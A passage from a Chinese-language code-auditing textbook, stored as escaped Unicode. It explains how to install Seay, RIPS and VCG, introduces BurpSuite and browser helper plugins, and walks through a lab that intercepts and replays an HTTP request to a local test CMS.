A\u5B83\u4EC5\u80FD\u591F\u5BF9\u5E38\u89C1\u7684Web\u5E94\u7528\u6F0F\u6D1E\u7C7B\u578B\u8FDB\u884C\u6316\u6398\uFF0C\u5BF9\u4E8E\u4E1A\u52A1\u903B\u8F91\u6F0F\u6D1E\u6316\u6398\u53EF\u4EE5\u8BF4\u662F\u675F\u624B\u65E0\u529B\u3002\u6240\u4EE5\uFF0C\u5BF9\u4E8E\u6709\u7ECF\u9A8C\u7684\u4EE3\u7801\u5BA1\u8BA1\u4EBA\u5458\u6765\u8BF4\uFF0C\u5BA1\u8BA1\u5DE5\u5177\u8D77\u5230\u7684\u4EC5\u4EC5\u662F\u8F85\u52A9\u4F5C\u7528\uFF0C\u4ED6\u4EEC\u4F1A\u5728\u5229\u7528\u5DE5\u5177\u7684\u57FA\u7840\u4E0A\u7ED3\u5408\u81EA\u5DF1\u7ECF\u9A8C\u6316\u6398\u51FA\u66F4\u6DF1\u5C42\u6B21\u7684\u6F0F\u6D1E\u3002\r
\r
### 1.5.5 \u81EA\u52A8\u5316\u5BA1\u8BA1\u5DE5\u5177\u90E8\u7F72\r
\r
1\u3001Seay\u5BA1\u8BA1\u5DE5\u5177\u90E8\u7F72\r
\r
  Seay\u5BA1\u8BA1\u5DE5\u5177\u53EA\u652F\u6301Windows\u7248\u672C\uFF0C\u901A\u8FC7\u4E0B\u8F7DSeay\u4EE3\u7801\u5BA1\u8BA1\u5DE5\u5177zip\u538B\u7F29\u5305\uFF0C\u89E3\u538B\u5E76\u70B9\u51FB\u201CSeay\u6E90\u4EE3\u7801\u5BA1\u8BA1\u7CFB\u7EDF.exe\u201D\u7A0B\u5E8F\u8FDB\u884C\u5B89\u88C5\uFF0C\u7136\u540E\u6839\u636E\u5B89\u88C5\u7A0B\u5E8F\u5411\u5BFC\u70B9\u51FB\u201C\u4E0B\u4E00\u6B65\u201D\u76F4\u81F3\u5B89\u88C5\u5B8C\u6210\uFF0C\u56FE1-25\u4E3ASeay\u4EE3\u7801\u5BA1\u8BA1\u5DE5\u5177\u5B89\u88C5\u5411\u5BFC\u3002\u5B89\u88C5\u6210\u529F\u540E\uFF0C\u7A0B\u5E8F\u5C06\u81EA\u52A8\u521B\u5EFASeay\u5BA1\u8BA1\u5DE5\u5177\u7684\u5FEB\u6377\u65B9\u5F0F\uFF0C\u70B9\u51FB\u5373\u53EF\u5F00\u59CB\u5BA1\u8BA1\u3002\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image054.jpg)\r
\r
\u56FE1-25 Seay\u4EE3\u7801\u5BA1\u8BA1\u5DE5\u5177\u5B89\u88C5\u56FE\r
\r
2\u3001RIPS\u5BA1\u8BA1\u5DE5\u5177\u90E8\u7F72\r
\r
\u76EE\u524DRIPS\u6700\u65B0\u7248\u672C\u662F2017\u5E746\u6708\u66F4\u65B0\u7684RIPS0.55\u7248\u672C\u3002RIPS\u5BA1\u8BA1\u5DE5\u5177\u7531PHP\u5F00\u53D1\uFF0C\u901A\u8FC7Web\u754C\u9762\u7684\u65B9\u5F0F\u8BBF\u95EE\u5E76\u4F7F\u7528\u3002\u7528\u6237\u53EF\u5728Windows\u6216Linux\u7CFB\u7EDF\u4E0B\u642D\u5EFAPHP\u53CAApache\u670D\u52A1\uFF0C\u4E5F\u53EF\u4F7F\u7528PhpStudy\u7B49\u96C6\u6210\u5316\u5DE5\u5177\u3002\u7136\u540E\uFF0C\u5C06RIPS\u6587\u4EF6\u5939\u590D\u5236\u5230\u7F51\u7AD9\u7684\u6839\u8DEF\u5F84\u5373\u53EF\u5B8C\u6210\u5B89\u88C5\u3002\u4F7F\u7528\u6D4F\u89C8\u5668\u8F93\u5165IP\u5730\u5740\u4E3A\uFF1Ahttp://127.0.0.1/rips-0.55/\u5373\u53EF\u8BBF\u95EERIPS\uFF0C\u5982\u56FE1-26\u6240\u793A\u3002\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image056.gif)\r
\r
\u56FE1-26 RIPS\u4EE3\u7801\u5BA1\u8BA1\u5DE5\u5177\u8BBF\u95EE\u56FE\r
\r
3\u3001VCG\u5BA1\u8BA1\u5DE5\u5177\u90E8\u7F72\r
\r
\u76EE\u524DVCG\u6700\u65B0\u7248\u672C\u662F2019\u5E7410\u6708\u66F4\u65B0\u7684VCG2.2.0\u7248\u672C\uFF0C\u7528\u6237\u5C06\u4E0B\u8F7DVCG\u5B89\u88C5\u5305\uFF0C\u7136\u540E\u53CC\u51FB\u201CVCD-Setup.msi\u201D\u8FD0\u884C\u6587\u4EF6\uFF0C\u9009\u62E9\u201CRepair VisualCodeGrepper\u201D\u9009\u9879\u8FDB\u884C\u5B89\u88C5\uFF0C\u5982\u56FE1-27\u6240\u793A\u3002\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image058.jpg)\r
\r
\u56FE1-27 VCG\u4EE3\u7801\u5BA1\u8BA1\u5DE5\u5177\u5B89\u88C5\u56FE\r
\r
## 1.6 \u4EE3\u7801\u5BA1\u8BA1\u8F85\u52A9\u5DE5\u5177\r
\r
\u5728\u8FDB\u884C\u4EE3\u7801\u5BA1\u8BA1\u7684\u8FC7\u7A0B\u4E2D\uFF0C\u5F88\u591A\u4EE3\u7801\u4E3A\u4E86\u4FDD\u8BC1\u6570\u636E\u7684\u5B89\u5168\u6027\u90FD\u4F1A\u4F7F\u7528\u8FC7\u6EE4\u51FD\u6570\u53CA\u7F16\u7801\u89E3\u5BC6\u8BBE\u7F6E\uFF0C\u800C\u8FD9\u4E9B\u51FD\u6570\u7684\u4E25\u8C28\u6027\u90FD\u9700\u8981\u8FDB\u884C\u53CD\u590D\u6D4B\u8BD5\u3002\u65E0\u8BBA\u662F\u5206\u6790\u6570\u636E\u5728\u7A0B\u5E8F\u6D41\u7A0B\u4E2D\u7684\u53D8\u5316\uFF0C\u8FD8\u662F\u9A8C\u8BC1EXP\u662F\u5426\u53EF\u884C\uFF0C\u90FD\u9700\u8981\u501F\u52A9\u4E00\u4E9B\u8F85\u52A9\u5DE5\u5177\u6765\u52A0\u901F\u6D4B\u8BD5\u6F0F\u6D1E\u3002\u672C\u8282\u5C06\u4ECB\u7ECD\u4EE3\u7801\u5BA1\u8BA1\u8FC7\u7A0B\u4E2D\u5E38\u7528\u7684\u8F85\u52A9\u5DE5\u5177\uFF0C\u5206\u522B\u662F\uFF1A\u6570\u636E\u5305\u5206\u6790\u5DE5\u5177\u3001\u6D4F\u89C8\u5668\u8F85\u52A9\u63D2\u4EF6\u3001\u7F16\u89E3\u7801\u5DE5\u5177\u3001\u6B63\u5219\u8868\u8FBE\u5F0F\u6D4B\u8BD5\u5DE5\u5177\u3001\u6570\u636E\u5E93\u76D1\u63A7\u5DE5\u5177\u3002\r
\r
### 1.6.1 \u6570\u636E\u5305\u5206\u6790\u5DE5\u5177\r
\r
BurpSuite\u662F\u6570\u636E\u5305\u5206\u6790\u7684\u5FC5\u5907\u5DE5\u5177\u4E4B\u4E00\uFF0C\u4EE3\u7801\u5BA1\u8BA1\u8FC7\u7A0B\u4E2D\uFF0C\u4E3A\u4E86\u8C03\u8BD5\u7A0B\u5E8F\u6D41\u7A0B\u53CA\u6D4B\u8BD5\u5B89\u5168\u6F0F\u6D1E\uFF0C\u901A\u5E38\u4F7F\u7528BurpSuite\u62E6\u622AHTTP\u6216HTTPS\u8BF7\u6C42\uFF0C\u4ECE\u800C\u5BF9\u8BF7\u6C42\u6570\u636E\u5305\u8FDB\u884C\u5206\u6790\u3002\u9664\u6B64\u4E4B\u5916\uFF0C\u8FD8\u5177\u5907\u7F51\u7AD9\u76EE\u5F55\u626B\u63CF\u3001\u6F0F\u6D1E\u626B\u63CF\u3001\u6F0F\u6D1E\u5206\u6790\u3001\u66B4\u529B\u7834\u89E3\u7B49\u529F\u80FD\u3002\r
\r
BurpSuite\u7684\u4E3B\u8981\u6A21\u5757\u6709\uFF1A\u76EE\u6807\u7F51\u7AD9\uFF08target\uFF09\u3001\u4EE3\u7406\uFF08proxy\uFF09\u3001\u4E2D\u7EE7\uFF08repeater\uFF09\u3001\u5165\u4FB5\uFF08intruder\uFF09\u3001\u7F16\u7801\uFF08decoder\uFF09\u3001\u7F16\u8F91\u5668\uFF08sequencer\uFF09\u3001\u5BF9\u6BD4\uFF08comparer\uFF09\u7B49\uFF0C\u56FE1-28\u4E3ABurpSuite\u6A21\u5757\u754C\u9762\u3002\r
\r
l \u76EE\u6807\uFF08target\uFF09\u3002\u8BE5\u6A21\u5757\u53EF\u4EE5\u663E\u793A\u5BF9\u7AEF\u7F51\u7AD9\u7684\u76EE\u5F55\u7ED3\u6784\u3002\r
\r
l \u4EE3\u7406\uFF08proxy\uFF09\u3002\u8BE5\u6A21\u5757\u4E3B\u8981\u7528\u4E8E\u62E6\u622AHTTP\u3001HTTPS\u7684\u4EE3\u7406\u670D\u52A1\u5668\u3002\u901A\u8FC7\u8BBE\u7F6E\u4EE3\u7406\uFF0CBurpSuite\u53EF\u4EE5\u4F5C\u4E3A\u6D4F\u89C8\u5668\u4E0E\u76EE\u6807\u5E94\u7528\u7A0B\u5E8F\u7684\u4E2D\u95F4\u4EBA\uFF0C\u4ECE\u800C\u62E6\u622A\u3001\u67E5\u770B\u3001\u4FEE\u6539\u4E24\u4E2A\u65B9\u5411\u7684\u6570\u636E\u6D41\u3002\r
\r
l \u4E2D\u7EE7\uFF08repeater\uFF09\u3002\u5728\u8BBE\u7F6E\u4EE3\u7406\u7684\u57FA\u7840\u4E0A\uFF0C\u4E2D\u7EE7\u529F\u80FD\u53EF\u4EE5\u901A\u8FC7\u624B\u52A8\u65B9\u5F0F\u5C06\u5DF2\u7ECF\u62E6\u622A\u7684\u8BF7\u6C42\u8FDB\u884C\u91CD\u65B0\u53D1\u9001\uFF0C\u4E5F\u53EF\u4EE5\u5C06\u5355\u4E2AHTTP\u8BF7\u6C42\u8FDB\u884C\u4FEE\u6539\u5E76\u91CD\u53D1\u3002\r
\r
l \u5165\u4FB5\uFF08intruder\uFF09\u3002\u5B9A\u5236\u7684\u9AD8\u5EA6\u53EF\u914D\u7F6E\u7684\u5DE5\u5177\uFF0C\u5BF9web\u5E94\u7528\u7A0B\u5E8F\u8FDB\u884C\u81EA\u52A8\u5316\u653B\u51FB\uFF0C\u5982\uFF1A\u679A\u4E3E\u6807\u8BC6\u7B26\uFF0C\u6536\u96C6\u6709\u7528\u7684\u6570\u636E\uFF0C\u4EE5\u53CA\u4F7F\u7528fuzzing\u6280\u672F\u63A2\u6D4B\u5E38\u89C4\u6F0F\u6D1E\u3002\r
\r
l \u7F16\u7801\uFF08decoder\uFF09\u3002\u8BE5\u6A21\u5757\u53EF\u4EE5\u5C06\u5B57\u6BB5\u8FDB\u884C\u7F16\u7801\u4E0E\u89E3\u7801\uFF0C\u5BF9\u8BF7\u6C42\u53C2\u6570\u8FDB\u884C\u89E3\u6790\u3002\r
\r
l \u7F16\u8F91\u5668\uFF08sequencer\uFF09\u3002\u8BE5\u6A21\u5757\u7528\u4E8E\u5206\u6790\u6570\u636E\u9879\u4E2D\u7684\u968F\u673A\u6027\u8D28\u91CF\u5DE5\u5177\u3002\u53EF\u4EE5\u7528\u5B83\u6765\u6D4B\u8BD5\u5E94\u7528\u7A0B\u5E8F\u7684session\u3001\u4F1A\u8BDD\u6216\u4E00\u4E9Bweb\u5B89\u5168\u6F0F\u6D1E\uFF0C\u6BD4\u5982\uFF1A\u53CD\u5F39CSRF tokens\uFF0C\u5BC6\u7801\u91CD\u7F6Etokens\u7B49\u3002\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image060.jpg)\r
\r
\u56FE1-28 BurpSuite\u6A21\u5757\u754C\u9762\r
\r
### 1.6.2 \u6D4F\u89C8\u5668\u8F85\u52A9\u63D2\u4EF6\u5DE5\u5177\r
\r
\u5728\u4EE3\u7801\u5BA1\u8BA1\u8FC7\u7A0B\u4E2D\u4F7F\u7528\u6D4F\u89C8\u5668\u8F85\u52A9\u5DE5\u5177\u5305\u62EC\uFF1A\u5F00\u53D1\u8005\u5DE5\u5177F12\u3001SwtichOmega\u3001Web Developer\u3001HackBar\u7B49\uFF0C\u672C\u8282\u5C06\u5BF9\u5E38\u89C1\u6293\u5305\u5DE5\u5177\u8FDB\u884C\u4ECB\u7ECD\u3002\r
\r
\uFF081\uFF09  \u6D4F\u89C8\u5668\u5F00\u53D1\u8005\u5DE5\u5177F12\r
\r
\u6D4F\u89C8\u5668\u5F00\u53D1\u8005\u5DE5\u5177\u901A\u5E38\u5728\u5F00\u542F\u6D4F\u89C8\u5668\u540E\uFF0C\u70B9\u51FB\u201CF12\u201D\u6309\u94AE\u5373\u53EF\u6253\u5F00\u3002\u5728\u5F00\u542F\u72B6\u6001\u4E0B\u70B9\u51FB\u7F51\u9875\u5373\u53EF\u55C5\u63A2HTTP\u53D1\u9001\u7684\u8BF7\u6C42\uFF08Request\uFF09\u548C\u54CD\u5E94\uFF08Response\uFF09\u6570\u636E\u5305\u3002\u4E0E\u6B64\u540C\u65F6\uFF0C\u8BE5\u5DE5\u5177\u8FD8\u53EF\u4EE5\u901A\u8FC7\u201C\u9009\u53D6\u9875\u9762\u4E2D\u5143\u7D20\u201D\u529F\u80FD\u67E5\u770B\u524D\u53F0\u9875\u9762\u4EE3\u7801\uFF0C\u8BE5\u529F\u80FD\u5728\u5F00\u53D1\u8FC7\u7A0B\u4E2D\u901A\u5E38\u7528\u4E8E\u5B9A\u4F4D\u524D\u53F0\u9875\u9762\u4EE3\u7801\u4F4D\u7F6E\u5E76\u8C03\u8BD5\u524D\u53F0\u4EE3\u7801\uFF0C\u5728\u5BA1\u8BA1\u8FC7\u7A0B\u4E2D\u53EF\u5BF9\u6709\u524D\u53F0\u6821\u9A8C\u7684\u4E00\u4E9BXSS\u3001SQL\u6CE8\u5165\u3001\u652F\u4ED8\u6F0F\u6D1E\u7B49\u9875\u9762\u8FDB\u884C\u5B9A\u4F4D\u4E0E\u4EE3\u7801\u5BA1\u8BA1\uFF0C\u56FE1-29\u4E3A\u6D4F\u89C8\u5668\u5F00\u53D1\u8005\u5DE5\u5177\u754C\u9762\u3002\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image062.jpg)\r
\r
\u56FE1-29 \u5F00\u53D1\u8005\u5DE5\u5177\u754C\u9762\r
\r
\uFF082\uFF09  HackBar\u6269\u5C55\u5DE5\u5177\r
\r
Hackbar\u662F\u4E00\u6B3E\u63D2\u4EF6\uFF0C\u8BE5\u5DE5\u5177\u65E0\u8BBA\u662FWeb\u6E17\u900F\u8FD8\u662F\u4EE3\u7801\u5BA1\u8BA1\u90FD\u53D1\u6325\u7740\u91CD\u8981\u4F5C\u7528\uFF0C\u5176\u7528\u6765\u5B9A\u5236HTTP\u6570\u636E\u5305\u8FDB\u884C\u53D1\u9001\uFF0C\u5B9A\u5236\u5185\u5BB9\u5305\u62EC\uFF1APOST\u65B9\u6CD5\u3001GET\u65B9\u6CD5\u3001Referer\u5B57\u6BB5\u3001Cookie\u5B57\u6BB5\u7B49\u3002\u8BE5\u5DE5\u5177\u8FD8\u5177\u6709\u7F16\u7801\u89E3\u7801\u529F\u80FD\uFF0C\u5728\u5BA1\u8BA1\u8FC7\u7A0B\u4E2D\u975E\u5E38\u5B9E\u7528\uFF0C\u56FE1-30\u4E3AHackBar\u5DE5\u5177\u754C\u9762\u3002\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image064.jpg)\r
\r
\u56FE1-30 HackBar\u5DE5\u5177\u754C\u9762\r
\r
\uFF083\uFF09  SwtichOmega\u6269\u5C55\u5DE5\u5177\r
\r
SwitchyOmega\u662F\u4E00\u6B3EChrome\u6D4F\u89C8\u5668\u7684\u4EE3\u7406\u6269\u5C55\u7A0B\u5E8F\uFF0C\u5176\u53EF\u4EE5\u5B9E\u73B0\u5FEB\u6377\u5730\u7BA1\u7406\u548C\u5207\u6362\u591A\u4E2A\u4EE3\u7406\u8BBE\u7F6E\u3002\u7528\u6237\u53EF\u901A\u8FC7\u8BBF\u95EESwitchyOmega\u5B98\u7F51\u4E0B\u8F7DChrome\u63D2\u4EF6\u7248\u672C\u8FDB\u884C\u5B89\u88C5\uFF0C\u5B89\u88C5\u5B8C\u6BD5\u540E\uFF0C\u5176\u9ED8\u8BA4\u5B58\u5728\u4E24\u79CD\u60C5\u666F\uFF1A\u4EE3\u7406\u670D\u52A1\u5668\u6A21\u5F0F\uFF08\u540D\u4E3Aproxy\uFF09\u548C\u81EA\u52A8\u5207\u6362\u6A21\u5F0F\uFF08auto switch\uFF09\u3002\u540C\u65F6\uFF0C\u7528\u6237\u53EF\u4EE5\u65B0\u5EFA\u60C5\u666F\u6216\u5728\u539F\u6709\u57FA\u7840\u4E0A\u4FEE\u6539\u4EE3\u7406\u8BBE\u7F6E\uFF0C\u901A\u8FC7\u70B9\u51FB\u6D4F\u89C8\u5668\u53F3\u4E0A\u89D2\u201C\u5706\u5F62\u201D\u56FE\u6807\u8FDB\u884C\u4EE3\u7406\u670D\u52A1\u5668\u8BBE\u7F6E\uFF0C\u5982\u56FE1-31\u6240\u793A\u3002\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image066.jpg)\r
\r
\u56FE1-31 SwitchyOmega\u5DE5\u5177\u754C\u9762\r
\r
\uFF084\uFF09  Web develplor\u6269\u5C55\u5DE5\u5177\r
\r
Web Developer\u662F\u4E00\u6B3EWeb\u5F00\u53D1\u4EBA\u5458\u5FC5\u5907\u7684\u6D4F\u89C8\u5668\u5B9E\u7528\u63D2\u4EF6\uFF0C\u5B83\u652F\u6301\u5F00\u53D1\u4EBA\u5458\u4FBF\u6377\u5730\u5BF9\u7F51\u9875\u7684HTML\u3001\u811A\u672C\u3001\u591A\u5A92\u4F53\u3001CSS\u3001\u7F13\u5B58\u3001\u56FE\u50CF\u7B49\u7F51\u9875\u5185\u5BB9\u8FDB\u884C\u8C03\u8BD5\u3002\u5B89\u88C5\u4E4B\u540E\u4F1A\u5728\u6D4F\u89C8\u5668\u5DE5\u5177\u680F\u6DFB\u52A0\u4E00\u4E2A\u9F7F\u8F6E\u72B6\u56FE\u6807\uFF0C\u70B9\u51FB\u8BE5\u56FE\u6807\u540E\u5C31\u53EF\u770B\u5230\u5927\u91CF\u7684Web\u5F00\u53D1\u5DE5\u5177\uFF0C\u5982\u56FE1-32\u6240\u793A\u3002\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image068.jpg)\r
\r
\u56FE1-32 Web Developer\u5DE5\u5177\u754C\u9762\r
\r
### 1.6.3 \u5B9E\u9A8C\uFF1ABurpSuite\u6570\u636E\u5305\u62E6\u622A\r
\r
\xB7 \u5B9E\u9A8C\u4ECB\u7ECD\r
\r
\u672C\u5B9E\u9A8C\u4F7F\u7528BurpSuite\u4E2D\u7684\u4EE3\u7406\u6A21\u5757\u8FDB\u884C\u914D\u7F6E\uFF0C\u8FDB\u884C\u4E00\u6B21HTTP\u8BF7\u6C42\u7684\u62E6\u622A\u8FC7\u7A0B\uFF0C\u7136\u540E\u4FEE\u6539\u6570\u636E\u5305\u5185\u5BB9\u5E76\u4F7F\u7528repeater\u6A21\u5757\u91CD\u53D1\u3002\r
\r
\xB7 \u9884\u5907\u77E5\u8BC6\r
\r
\u53C2\u80031.6.1\u8282\uFF1A\u6570\u636E\u5305\u5206\u6790\u5DE5\u5177\uFF1B1.6.2\u8282\uFF1A\u6D4F\u89C8\u5668\u8F85\u52A9\u63D2\u4EF6\u5DE5\u5177\r
\r
\xB7 \u5B9E\u9A8C\u76EE\u7684\r
\r
\u638C\u63E1\u4F7F\u7528BurpSuite\u4EE3\u7406\u914D\u7F6E\u65B9\u6CD5\uFF1B\r
\r
\u638C\u63E1\u4F7F\u7528BurpSuite\u91CD\u53D1\u6570\u636E\u5305\u65B9\u6CD5\u3002\r
\r
\xB7 \u5B9E\u9A8C\u73AF\u5883\r
\r
Windows\u64CD\u4F5C\u7CFB\u7EDF\u4E3B\u673A\uFF08\u5DF2\u5B89\u88C5BurpSuite\u3001Chrome\u6D4F\u89C8\u5668\uFF09\u3002\r
\r
\xB7 \u5B9E\u9A8C\u6B65\u9AA4\r
\r
\u70B9\u51FBBurpSuite\u4E2D\u7684\u529F\u80FD\u6A21\u5757\u4E2D\u7684\u201Cproxy\u201D\u6A21\u5757\uFF0C\u8BE5\u6A21\u5757\u5C06\u4E3ABurpSuite\u5DE5\u5177\u914D\u7F6E\u4EE3\u7406\u3002\u7136\u540E\u70B9\u51FB\u201COptions\u201D\u9009\u9879\u8FDB\u884C\u8BE5\u6A21\u5757\u7684\u914D\u7F6E\u5DE5\u4F5C\uFF0C\u9ED8\u8BA4\u60C5\u51B5\u4E0BBurpSuite\u4F1A\u7ED9\u51FA\u9ED8\u8BA4\u7684\u4EE3\u7406\u76D1\u542C\u5668\u201CProxy Linstener\u201D\u914D\u7F6E\u5185\u5BB9\u4E3A\u201C127.0.0.1:8080\u201D\uFF08\u4F7F\u7528\u672C\u673A\u76848080\u7AEF\u53E3\u4F5C\u4E3A\u4EE3\u7406\u8F6C\u53D1\u6570\u636E\u5305\uFF09\u3002\u4E5F\u53EF\u4EE5\u9009\u62E9\u60F3\u8981\u914D\u7F6E\u7684\u4E3B\u673A\u4E0E\u7AEF\u53E3\uFF0C\u5F62\u5F0F\u4E3A\uFF1A\u201C\u8981\u76D1\u542C\u7684\u4E3B\u673AIP\u5730\u5740\uFF1A\u4F7F\u7528\u7684\u4EE3\u7406\u7AEF\u53E3\u201D\uFF0C\u4F8B\u5982\uFF1A192.168.0.1:8888\u3002\u5982\u679C\u53EA\u5728\u672C\u673A\u8FDB\u884C\u914D\u7F6E\uFF0C\u5219\u4F7F\u7528\u9ED8\u8BA4\u914D\u7F6E\u5373\u53EF\uFF0C\u5982\u56FE1-33\u6240\u793A\u3002\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image070.jpg)\r
\r
\u56FE1-33 BurpSuite\u4EE3\u7406\u8BBE\u7F6E\r
\r
\u4E3ABurpSuite\u914D\u7F6E\u597D\u4EE3\u7406\u4EE5\u540E\uFF0C\u6211\u4EEC\u9700\u8981\u4E3A\u4E3B\u673A\u7684\u6D4F\u89C8\u5668\u4E5F\u914D\u7F6E\u540C\u6837\u7684\u4EE3\u7406\uFF0C\u8FD9\u6837Web\u6570\u636E\u5305\u624D\u80FD\u4ECE\u6D4F\u89C8\u5668\u8F6C\u53D1\u5230\u4EE3\u7406\u3002Chrome\u6D4F\u89C8\u5668\u4E2D\u4F7F\u7528SwitchOmega\u8FDB\u884C\u4EE3\u7406\u914D\u7F6E\u3002\u914D\u7F6E\u987A\u5E8F\u4E3A\uFF1A\u70B9\u51FB\u201CSwitchOmega\u56FE\u6807\u201D\xE0\u201C\u9009\u9879\u201D\xE0 \u201Cproxy\u201D\u3002\u9700\u8981\u6CE8\u610F\u7684\u662F\uFF1A\u6D4F\u89C8\u5668\u4EE3\u7406\u7684\u914D\u7F6E\u8981\u4E0EBurpSuite\u4E2D\u7684\u4EE3\u7406\u914D\u7F6E\u76F8\u540C\uFF0C\u7531\u4E8E\u4E0A\u4E00\u6B65BurpSuite\u4E2D\u914D\u7F6E\u7684\u4EE3\u7406\u4E3A\u201C127.0.0.1:8080\u201D\uFF0C\u56E0\u6B64\uFF0C\u6D4F\u89C8\u5668\u4E2Dproxy\u4E5F\u4E3A\u201C127.0.0.1:8080\u201D\uFF0C\u5982\u56FE1-34\u6240\u793A\u3002\r
\r
**![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image072.jpg)**\r
\r
\u56FE1-34 \u6D4F\u89C8\u5668\u4EE3\u7406\u914D\u7F6E\u56FE\r
\r
\u4EE3\u7406\u8BBE\u7F6E\u6210\u529F\u4EE5\u540E\uFF0C\u5F00\u59CB\u4F7F\u7528BurpSuite\u8FDB\u884CHTTP\u6570\u636E\u5305\u7684\u62E6\u622A\u5DE5\u4F5C\uFF0C\u9996\u5148\u70B9\u51FB\u201Cproxy\u201D\u6A21\u5757\uFF0C\u7136\u540E\u9009\u62E9\u62E6\u622A\u5668\u201CIntercept\u201D\uFF0C\u53EF\u4EE5\u770B\u5230\u5B58\u5728\u201CForward\u201D\u3001\u201CDrop\u201D\u3001\u201CIntercept is off\u201D\u3001\u201CAction\u201D\u56DB\u4E2A\u9009\u9879\uFF0C\u8FD9\u56DB\u4E2A\u9009\u9879\u5206\u522B\u8868\u793A\u201C\u5C06\u62E6\u622A\u7684\u6570\u636E\u5305\u8FDB\u884C\u8F6C\u53D1\u201D\u3001\u201C\u5C06\u62E6\u622A\u7684\u6570\u636E\u5305\u4E22\u5F03\u201D\u3001\u201C\u62E6\u622A\u5668\u5173\u95ED\u4E0E\u5F00\u542F\u201D\u3001\u201C\u5C06\u6570\u636E\u5305\u8FDB\u884C\u4E0B\u4E00\u6B65\u64CD\u4F5C\u201D\uFF0C\u5982\u56FE1-35\u6240\u793A\u3002\u53EF\u4EE5\u5355\u51FB\u201CIntercept is off\u201D\u9009\u9879\u5F00\u542F\u62E6\u622A\u5668\u4ECE\u800C\u62E6\u622AHTTP\u6570\u636E\u5305\u3002\r
\r
**![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image074.jpg)**\r
\r
\u56FE1-35 \u62E6\u622A\u5668\u9009\u9879\u56FE\r
\r
\u5F00\u59CB\u8FDB\u884CHTTP\u6570\u636E\u5305\u62E6\u622A\uFF0C\u9996\u5148\u70B9\u51FB\u201CIntercept is off\u201D\u9009\u9879\uFF0C\u5F53\u8BE5\u6309\u94AE\u5207\u6362\u4E3A\u201CIntercept is on\u201D\uFF0C\u8BF4\u660E\u62E6\u622A\u5668\u5DF2\u7ECF\u6253\u5F00\u3002\u901A\u8FC7\u6D4F\u89C8\u5668\u8BBF\u95EEHTTP\u7F51\u9875\uFF0C\u8FD9\u91CC\u4EE5\u4E0A\u6587\u642D\u5EFA\u768474CMS\u4E3A\u4F8B\uFF0C\u5F53\u8BBF\u95EE\u7F51\u5740\u4E3A\u201Chttp://192.168.0.7/74cms30/user/login.php\u201D\u65F6\uFF0C\u6D4F\u89C8\u5668\u5E76\u6CA1\u6709\u663E\u793A\u7F51\u9875\u9875\u9762\uFF0C\u5176\u8BF7\u6C42\u6570\u636E\u5305\u88ABBurpSuite\u5DE5\u5177\u62E6\u622A\uFF0C\u6253\u5F00BurpSuite\u53EF\u4EE5\u770B\u5230\u5176HTTP\u6570\u636E\u5305\uFF0C\u5982\u56FE1-36\u6240\u793A\u3002\r
\r
\u6CE8\u610F\uFF1A\u672C\u5B9E\u9A8C\u53EA\u7ED9\u51FA\u62E6\u622AHTTP\u8BF7\u6C42\u7684\u8FC7\u7A0B\uFF0C\u82E5\u4F7F\u7528BurpSuite\u62E6\u622AHTTPS\u8BF7\u6C42\uFF0C\u8BF7\u81EA\u884C\u4E3A\u6D4F\u89C8\u5668\u5B89\u88C5CA\u8BC1\u4E66\u3002\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image076.jpg)\r
\r
\u56FE1-36 \u62E6\u622AHTTP\u6570\u636E\u5305\r
\r
\u53F3\u952E\u4E0A\u8FF0\u6570\u636E\u5305\uFF0C\u70B9\u51FB\u201Csend to repeater\u201D\u5C06\u6570\u636E\u5305\u53D1\u9001\u81F3Repeater\u6A21\u5757\uFF0C\u7136\u540E\u70B9\u51FB\u201CRepeater\u201D\u9009\u9879\u5207\u6362\u754C\u9762\uFF0C\u540C\u65F6\u53EF\u4EE5\u770B\u5230\u88AB\u62E6\u622A\u7684\u6570\u636E\u5305\u5DF2\u7ECF\u5728Repeater\u6A21\u5757\u7B49\u5F85\u53D1\u9001\uFF0C\u70B9\u51FB\u201CGo\u201D\u53D1\u9001\u6570\u636E\u5305\uFF0C\u67E5\u770B\u6570\u636E\u5305\u54CD\u5E94\u7ED3\u679C\uFF0C\u54CD\u5E94\u72B6\u6001\u7801\u4E3A200\u3002\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image078.jpg)\r
\r
\u56FE1-37 \u91CD\u53D1\u6570\u636E\u5305\u56FE\r
\r
### 1.6.4 \u7F16\u89E3\u7801\u5DE5\u5177\r
\r
\u5728\u4EE3\u7801\u5BA1\u8BA1\u8FC7\u7A0B\u4E2D\uFF0C\u4F7F\u7528\u7F16\u7801\u5DE5\u5177\u5BF9\u6570\u636E\u8FDB\u884C\u7F16\u7801\u4E0E\u89E3\u7801\u662F\u57FA\u672C\u5DE5\u4F5C\u4E4B\u4E00\uFF0C\u5F88\u591A\u65F6\u5019\u9700\u8981\u4F7F\u7528\u4E0D\u540C\u7684\u7F16\u7801\u6765\u8FDB\u884C\u6A21\u7CCA\u6F0F\u6D1E\u6D4B\u8BD5\uFF0C\u540C\u65F6\u5F88\u591A\u6F0F\u6D1E\u4E5F\u90FD\u7531\u4E8E\u7F16\u7801\u95EE\u9898\u4EA7\u751F\u3002\u4F8B\u5982\uFF1ASQL\u6CE8\u5165\u4E2D\u7ED5\u8FC7\u8FC7\u6EE4\u51FD\u6570addslashes\u95EE\u9898\u4E0A\uFF0C\u5B58\u5728url\u7F16\u7801\u7ED5\u8FC7\u3001json\u7F16\u7801\u7ED5\u8FC7\u3001base64\u7F16\u7801\u7ED5\u8FC7\u7B49\uFF1B\